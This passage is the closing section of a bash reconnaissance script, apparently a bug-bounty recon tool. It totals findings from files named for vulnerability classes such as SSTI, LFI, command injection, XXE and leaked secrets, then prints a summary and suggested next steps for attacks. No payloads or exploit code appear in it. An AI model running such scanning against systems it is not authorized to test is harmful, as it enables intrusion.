for f in "$BUGDIR"/ssti.txt "$BUGDIR"/lfi.txt "$BUGDIR"/open_redirects.txt "$BUGDIR"/nosqli.txt "$BUGDIR"/command_injection.txt "$BUGDIR"/host_header.txt "$BUGDIR"/phpinfo.txt "$BUGDIR"/cors_reflected.txt "$BUGDIR"/clickjacking.txt "$BUGDIR"/cache_deception.txt "$BUGDIR"/tabnabbing.txt "$BUGDIR"/graphql.txt "$BUGDIR"/session_fixation.txt "$BUGDIR"/xxe.txt "$BUGDIR"/jwt_tokens.txt "$BUGDIR"/websocket_urls.txt "$BUGDIR"/websocket_endpoints.txt "$BUGDIR"/rate_limit.txt "$BUGDIR"/header_leaks.txt "$BUGDIR"/s3_buckets.txt "$BUGDIR"/xss_reflected.txt; do
  [ -f "$f" ] && total_bugs=$(( total_bugs + $(wc -l < "$f") ))
done
for f in "$BUGDIR"/*.json; do
  [ -f "$f" ] && total_bugs=$(( total_bugs + $(jq -c '.' "$f" 2>/dev/null | wc -l) ))
done
echo ""
echo -e "  ${C}┃${O}  ${G}✓${O} All results in ${D}bugs/${O} (${W}$total_bugs${O} total findings)"
echo -e "  ${C}┃${O}  ${D}──────────────────────────────────────────${O}"

# ==================================================================
# FINAL SUMMARY
# ==================================================================
echo ""
echo -e "  ${C}╔════════════════════════════════════════════╗${O}"
echo -e "  ${C}║${O}  ${W}RECON COMPLETE${O}                                  ${C}║${O}"
echo -e "  ${C}║${O}  ${D}──────────────────────────────────────${O}   ${C}║${O}"
summary_item "Subdomains:" "$total_subs"
summary_item "IPs Resolved:" "$total_ips"
summary_item "Alive Hosts:" "$alive_count"
summary_item "Takeover Hits:" "$takeover_count"
summary_item "Tech Detections:" "$tech_nuclei_count"
summary_item "WAFs Identified:" "$waf_count"
summary_item "Open Ports:" "$total_open_ports"
summary_item "Total URLs:" "$total_endpoints"
summary_item "Juicy Endpoints:" "$juicy_count"
summary_item "XSS Candidates:" "$xss_count"
summary_item "Param URLs:" "$total_param_urls"
summary_item "JS Files:" "$total_js"
summary_item "Secrets Found:" "$secrets_found"
summary_item "Bugs Detected:" "$total_bugs"
echo -e "  ${C}║${O}  ${D}──────────────────────────────────────${O}   ${C}║${O}"
echo -e "  ${C}║${O}  ${D}Output:${O} ${B}$OUTPUT_DIR${O}        ${C}║${O}"
echo -e "  ${C}╚════════════════════════════════════════════╝${O}"
echo ""
echo -e "  ${D}Quick next steps:${O}"
echo -e "  ${D}▸${O} Inj: ${B}xss_reflected.txt${O} ${B}ssti.txt${O} ${B}lfi.txt${O} ${B}nosqli.txt${O} ${B}command_injection.txt${O} ${B}xxe.txt${O}"
echo -e "  ${D}▸${O} SSRF/Redirect: ${B}open_redirects.txt${O} ${B}crlf*.txt${O} ${B}host_header.txt${O}"
echo -e "  ${D}▸${O} Config: ${B}sensitive_files.json${O} ${B}actuator.json${O} ${B}phpinfo.txt${O} ${B}s3_buckets.txt${O}"
echo -e "  ${D}▸${O} Web: ${B}cors.json${O} ${B}cors_reflected.txt${O} ${B}clickjacking.txt${O} ${B}cache_deception.txt${O} ${B}tabnabbing.txt${O}"
echo -e "  ${D}▸${O} Auth: ${B}session_fixation.txt${O} ${B}graphql.txt${O} ${B}panels.json${O} ${B}sqli.json${O}"
echo -e "  ${D}▸${O} Secrets: ${B}js_secrets.json${O} ${B}jwt_tokens.txt${O} ${B}websocket*.txt${O} ${B}rate_limit.txt${O}"
echo ""
